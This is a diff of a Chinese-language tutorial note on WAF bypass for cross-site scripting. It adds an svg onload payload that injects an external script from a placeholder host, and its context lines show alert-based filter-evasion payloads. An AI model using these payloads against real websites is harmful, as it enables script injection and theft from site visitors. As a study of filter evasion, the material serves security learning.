@@ -150,10 +150,17 @@ waf拦截
 
 `<svg/onload=setInterval('al'%2b'ert(1)')>`
 
+![21](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yd573lavj30uj09qwf9.jpg)
+
+绕过waf，引用外部js。
+```html
+<svg/onload=setInterval(appendChild(createElement('script')).src='http://xx.xx/eeW')>
+```
+![22](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yd9dqh46j30uj0e4q4j.jpg)
+
+关于运用基于DOM的方法创建和插入节点把外部JS文件注入到网页，这种方法在<<XSS跨站脚本gj剖析与防御>>有介绍过。我这里简单演示下，如果你了解或者不感兴趣可以跳过这段。
+
 `Set.constructor`不是很常见，但是也能执行代码
-
-
-
 `<svg/onload=Set.constructor('ale'%2B'rt(13)')()>`
 
 其他：
